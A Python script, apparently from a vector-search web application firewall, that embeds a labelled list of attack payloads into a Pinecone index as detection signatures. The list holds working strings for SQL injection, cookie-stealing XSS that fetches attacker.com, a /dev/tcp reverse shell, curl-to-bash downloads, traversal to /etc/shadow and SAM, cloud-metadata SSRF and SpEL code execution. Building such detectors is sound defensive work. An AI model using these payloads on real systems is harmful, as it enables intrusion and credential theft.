import asyncio
import logging
import os
import sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from typing import List, Dict, Any
from pinecone import Pinecone, ServerlessSpec
from config import settings
from core.embeddings import embedding_service

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s]: %(message)s")
logger = logging.getLogger("WAF.InitVectorDB")

# Curated dataset of malicious attack vectors and benign control inputs
INITIAL_PAYLOAD_DATASET: List[Dict[str, Any]] = [
    # ------------------ SQL Injection (SQLi) ------------------
    {
        "id": "sqli-001",
        "payload": "' OR '1'='1' --",
        "attack_type": "SQLi",
        "severity": "CRITICAL",
        "description": "Classic authentication bypass tautology"
    },
    {
        "id": "sqli-002",
        "payload": "admin' UNION SELECT 1, username, password FROM users --",
        "attack_type": "SQLi",
        "severity": "CRITICAL",
        "description": "Union-based credential extraction"
    },
    {
        "id": "sqli-003",
        "payload": "1; WAITFOR DELAY '0:0:10'--",
        "attack_type": "SQLi",
        "severity": "HIGH",
        "description": "Time-based blind SQL injection"
    },
    {
        "id": "sqli-004",
        "payload": "') OR 1=1; EXEC xp_cmdshell('whoami');--",
        "attack_type": "SQLi_Stacked",
        "severity": "CRITICAL",
        "description": "Stacked query command execution via SQLi"
    },

    # ------------------ Cross-Site Scripting (XSS) ------------------
    {
        "id": "xss-001",
        "payload": "<script>alert(document.cookie)</script>",
        "attack_type": "XSS",
        "severity": "HIGH",
        "description": "Classic script tag DOM cookie theft"
    },
    {
        "id": "xss-002",
        "payload": "<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>",
        "attack_type": "XSS",
        "severity": "HIGH",
        "description": "Event handler inline injection with exfiltration"
    },
    {
        "id": "xss-003",
        "payload": "<svg onload=javascript:confirm(1)>",
        "attack_type": "XSS",
        "severity": "MEDIUM",
        "description": "SVG vector event handler injection"
    },
    {
        "id": "xss-004",
        "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "attack_type": "XSS_Polyglot",
        "severity": "HIGH",
        "description": "Context-breaking polyglot XSS vector"
    },

    # ------------------ Command Injection (RCE) ------------------
    {
        "id": "rce-001",
        "payload": "; cat /etc/passwd",
        "attack_type": "Command_Injection",
        "severity": "CRITICAL",
        "description": "POSIX command separator sensitive file disclosure"
    },
    {
        "id": "rce-002",
        "payload": "| /bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "attack_type": "Command_Injection",
        "severity": "CRITICAL",
        "description": "Reverse TCP interactive shell pipe"
    },
    {
        "id": "rce-003",
        "payload": "$(curl -s http://attacker.com/malware.sh | bash)",
        "attack_type": "Command_Injection",
        "severity": "CRITICAL",
        "description": "Subshell download and pipe execution"
    },
    {
        "id": "rce-004",
        "payload": "& whoami & dir C:\\",
        "attack_type": "Command_Injection",
        "severity": "HIGH",
        "description": "Windows cmd chaining operator"
    },

    # ------------------ Path Traversal / LFI ------------------
    {
        "id": "lfi-001",
        "payload": "../../../../etc/shadow",
        "attack_type": "Path_Traversal",
        "severity": "CRITICAL",
        "description": "Deep directory traversal to password hashes"
    },
    {
        "id": "lfi-002",
        "payload": "..%252f..%252f..%252fwindows/system32/config/SAM",
        "attack_type": "Path_Traversal",
        "severity": "CRITICAL",
        "description": "Double URL-encoded traversal to SAM registry"
    },

    # ------------------ SSRF / Metadata Exfiltration ------------------
    {
        "id": "ssrf-001",
        "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "attack_type": "SSRF",
        "severity": "CRITICAL",
        "description": "AWS EC2 instance metadata credential exfiltration"
    },
    {
        "id": "ssrf-002",
        "payload": "http://127.0.0.1:2375/v1.24/containers/json",
        "attack_type": "SSRF",
        "severity": "HIGH",
        "description": "Internal unauthenticated Docker daemon API access"
    },

    # ------------------ Server-Side Template Injection (SSTI) ------------------
    {
        "id": "ssti-001",
        "payload": "{{7*7}}",
        "attack_type": "SSTI",
        "severity": "MEDIUM",
        "description": "Basic template injection probe expression"
    },
    {
        "id": "ssti-002",
        "payload": "${T(java.lang.Runtime).getRuntime().exec('calc.exe')}",
        "attack_type": "SSTI",
        "severity": "CRITICAL",
        "description": "Spring Expression Language (SpEL) code execution"
    },
]


async def initialize_and_seed_pinecone():
    """
    1. Verifies/creates Pinecone index with cosine metric.
    2. Batch embeds threat payloads using Google Gemini embeddings.
    3. Upserts vector embeddings with metadata to Pinecone.
    """
    if not settings.pinecone_api_key:
        logger.error("PINECONE_API_KEY is not defined. Please set it in your environment or .env.")
        return

    logger.info("Connecting to Pinecone...")
    pc = Pinecone(api_key=settings.pinecone_api_key)

    existing_indexes = [idx["name"] for idx in pc.list_indexes()]
    logger.info(f"Existing indexes: {existing_indexes}")

    if settings.pinecone_index_name not in existing_indexes:
        logger.info(f"Creating Pinecone index '{settings.pinecone_index_name}' (dim={settings.embedding_dimension})...")
        pc.create_index(
            name=settings.pinecone_index_name,
            dimension=settings.embedding_dimension,
            metric="cosine",
            spec=ServerlessSpec(cloud=settings.pinecone_cloud, region=settings.pinecone_region)
        )
        logger.info("Index created successfully. Waiting for index readiness...")
        await asyncio.sleep(5)
    else:
        logger.info(f"Index '{settings.pinecone_index_name}' already exists.")

    index = pc.Index(settings.pinecone_index_name)

    # Prepare payloads for batch embedding
    texts_to_embed = [item["payload"] for item in INITIAL_PAYLOAD_DATASET]
    logger.info(f"Generating embeddings for {len(texts_to_embed)} threat signatures...")

    embeddings = await embedding_service.get_embeddings_batch(texts_to_embed)

    vectors_to_upsert = []
    for item, emb in zip(INITIAL_PAYLOAD_DATASET, embeddings):
        vectors_to_upsert.append({
            "id": item["id"],
            "values": emb,
            "metadata": {
                "payload": item["payload"],
                "attack_type": item["attack_type"],
                "severity": item["severity"],
                "description": item["description"],
            }
        })

    logger.info(f"Upserting {len(vectors_to_upsert)} vectors to Pinecone...")
    index.upsert(vectors=vectors_to_upsert)
    logger.info("Seeding complete! Pinecone vector database is now primed with malicious vectors.")

    stats = index.describe_index_stats()
    logger.info(f"Current Index Stats: total_vector_count={stats.get('total_vector_count')}")


if __name__ == "__main__":
    asyncio.run(initialize_and_seed_pinecone())
